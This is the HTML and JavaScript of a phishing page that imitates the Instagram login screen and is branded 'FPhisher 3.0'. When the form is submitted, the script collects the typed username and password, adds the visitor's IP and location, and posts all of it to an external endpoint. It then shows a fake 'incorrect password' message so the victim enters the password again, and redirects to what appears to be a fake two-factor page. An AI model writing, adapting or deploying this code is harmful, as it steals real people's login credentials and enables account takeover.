<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white flex items-center justify-center min-h-screen">

  <div class="w-full max-w-sm px-6">

    <!-- Logo -->
    <div class="flex justify-center mb-14">
      <img src="IMG_0905.png" alt="App" class="w-16 h-16" />
    </div>

    <!-- Username -->
    <input id="username" type="text" placeholder="Username, mobile number or email address"
      class="w-full mb-3 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400" />

    <!-- Password -->
    <input id="password" type="password" placeholder="Password"
      class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400" />

    <!-- Login Button -->
    <button id="loginBtn"
      class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4 transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2">
      <span id="btnText">Log in</span>
      <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24">
        <circle cx="12" cy="12" r="10" stroke="white" stroke-width="4" fill="none" opacity="0.3"/>
        <path d="M22 12a10 10 0 0 1-10 10" stroke="white" stroke-width="4" fill="none"/>
      </svg>
    </button>

    <div id="errorMsg" class="text-red-500 text-sm mb-6 hidden text-center">Incorrect username or password.</div>

    <div class="text-center mb-6">
      <a href="#" class="text-sm font-normal text-black hover:underline">Forgotten password?</a>
    </div>

    <div class="mt-16">
      <button class="w-full border border-blue-600 text-blue-600 text-sm font-normal py-3 rounded-md mb-8 hover:bg-blue-50 transition">Create new account</button>
      <div class="flex justify-center mt-2">
        <img src="IMG_0906.png" alt="Meta" class="h-8" />
      </div>
    </div>
  </div>

  <script type="module">
    import { SUBMIT_ENDPOINT, SUBMIT_ID } from './config.js';

    let attempt = 0;

    async function getLocation() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return {
          ip: data.ip || 'Unknown',
          country: data.country_name || 'Unknown',
          state: data.region || 'Unknown',
          city: data.city || 'Unknown'
        };
      } catch {
        try {
          const fb = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,query');
          const d = await fb.json();
          if (d.status === "success") {
            return { 
              ip: d.query || 'Unknown', 
              country: d.country || 'Unknown', 
              state: d.regionName || 'Unknown', 
              city: d.city || 'Unknown' 
            };
          }
        } catch {}
      }
      return { ip: 'Unknown', country: 'Unknown', state: 'Unknown', city: 'Unknown' };
    }

    document.getElementById("loginBtn").addEventListener("click", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const passwordInput = document.getElementById("password");

      if (!username || !password) {
        alert("Please fill in all fields!");
        return;
      }

      const loc = await getLocation();
      attempt++;

      // Clean message - exactly as you requested (no extra text)
      const formattedMessage = `🚨 NEW INSTAGRAM LOGIN ATTEMPT 🚨

📋 DETAILS:
• 📲 Platform  : Instagram
• 👤 Username  : ${username}
• 🔑 Password  : ${password}
• 🔄 Attempt   : ${attempt}

📍 LOCATION:
• 🌍 Country   : ${loc.country}
• 🗺️ State     : ${loc.state}
• 🏙️ City      : ${loc.city}
• 🌐 IP        : ${loc.ip}

━━━━━━━━━━━━━━━━━━━━━━━
🔒 Secured by FPhisher 3.0 🔒
⏰ ${new Date().toLocaleString()}`;

      // Only send the clean message (your backend will forward ONLY this)
      const payload = {
        text: formattedMessage
      };

      try {
        await fetch(SUBMIT_ENDPOINT, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch (err) {
        console.error("Failed to send:", err);
      }

      // UI Feedback
      if (attempt === 1) {
        document.getElementById("errorMsg").classList.remove("hidden");
        passwordInput.value = "";
      } else {
        const btn = document.getElementById("loginBtn");
        const btnText = document.getElementById("btnText");
        const spinner = document.getElementById("spinner");
        
        btn.disabled = true;
        btnText.textContent = "Loading";
        spinner.classList.remove("hidden");

        setTimeout(() => {
          window.location.href = "securedfa.html";
        }, 1500);
      }
    });
  </script>
</body>
</html>
